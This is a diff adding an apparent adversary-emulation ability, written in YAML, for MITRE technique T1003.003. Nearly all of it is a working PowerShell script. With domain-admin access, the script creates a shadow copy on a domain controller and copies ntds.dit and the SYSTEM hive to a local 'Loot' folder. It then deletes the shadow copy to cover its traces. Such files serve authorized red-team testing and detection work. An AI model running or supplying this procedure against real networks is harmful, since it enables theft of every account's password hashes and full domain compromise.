@@ -1,0 +1,36 @@
+- id: 0f2i3d4e-h6g7-4i8j-de4f-exfiltrate-ntds
+  name: Collection - Exfiltrate NTDS.dit from DC via Remote PowerShell
+  description: Uses DA privileges to remotely exfiltrate ntds.dit and the SYSTEM hive.
+  tactic: credential-access
+  technique:
+    attack_id: T1003.003
+    name: "OS Credential Dumping: NTDS"
+  requirements:
+    - plugins.stockpile.app.requirements.existential: 
+      - domain.admin.pwned
+      - domain.controller.hostname
+  platforms:
+    windows:
+      psh:
+        command: |
+          $dc = "#{domain.controller.hostname}"
+          $localLootDir = "C:\Users\Public\Loot"
+          New-Item -Path $localLootDir -ItemType Directory -ErrorAction SilentlyContinue
+          $vssOutput = Invoke-Command -ComputerName $dc -ScriptBlock { cmd /c 'vssadmin create shadow /for=C:' } | Out-String
+          $vssOutput -match "(\\\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy\d+)"
+          $shadowPathOnDC = $Matches[1]
+          $remoteLink = "C:\ntds_loot"
+          Invoke-Command -ComputerName $dc -ScriptBlock { param($path, $link) cmd /c mklink /D $link $path } -ArgumentList $shadowPathOnDC, $remoteLink
+          Copy-Item -Path "\\$dc\c$\ntds_loot\windows\ntds\ntds.dit" -Destination "$localLootDir\ntds.dit" -Force
+          Copy-Item -Path "\\$dc\c$\ntds_loot\windows\system32\config\system" -Destination "$localLootDir\system.hive" -Force
+          Invoke-Command -ComputerName $dc -ScriptBlock { param($link) rmdir $link } -ArgumentList $remoteLink
+          Invoke-Command -ComputerName $dc -ScriptBlock { param($path) $shadowId = (vssadmin list shadows | Select-String -Pattern $path -Context 0,1).Context.PostContext[0].Split('{')[-1].Trim('}'); vssadmin delete shadows /Shadow={$shadowId} /Quiet } -ArgumentList $shadowPathOnDC
+          if (Test-Path "$localLootDir\ntds.dit") {
+            Write-Host "NTDS-Exfiltrated-To: $localLootDir\ntds.dit"
+          }
+        parsers:
+          plugins.adversary_emulation.app.parsers.regex_parser:
+            - source: 'file.ntds.exfiltrated_path'
+              edge_label: 'was_exfiltrated_to'
+              custom_parser_vals:
+                regex: 'NTDS-Exfiltrated-To:\s+(.*)'
